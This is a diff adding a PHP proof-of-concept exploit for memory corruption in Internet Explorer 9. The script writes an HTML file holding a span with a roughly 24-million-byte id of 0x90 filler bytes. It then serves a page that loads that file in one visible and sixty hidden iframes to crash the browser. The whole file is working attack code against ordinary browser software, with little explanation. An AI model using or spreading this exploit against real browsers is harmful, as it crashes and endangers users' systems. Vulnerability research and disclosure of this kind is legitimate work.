@@ -1,0 +1,40 @@
+<?php
+
+/**********************************************************
+ *   Internet Explorer 9 Memory Corruption PoC Exploit    *
+ **********************************************************
+ *                                                        *
+ * Successfully executed with IE9 version 9.0.8112.16421  *
+ *                                                        *
+ * Discovered by Jean Pascal Pereira <pereira@secbiz.de>  *
+ *                                                        *
+ **********************************************************/
+
+set_time_limit(0);
+
+ini_set('memory_limit', '300M'); 
+
+if(!file_exists("junk.htm"))
+{
+  $string = "<span id='";
+  
+  for($i = 0; $i < 24117256; $i++)
+  {
+    $string .= "\x90";
+  }
+  $string .= "'></span>";
+  
+  file_put_contents("junk.htm", $string);
+}
+
+print "View the sourcecode of the iframe below (right click -> view source): <br />\n";
+print "<iframe style='width: 800px; height: 500px;' src='junk.htm'>\n";
+
+for($i = 0; $i < 60; $i++)
+{
+  print "<iframe style='display:none' src='junk.htm'>\n";
+} 
+
+/* http://0xffe4.org */
+
+?>
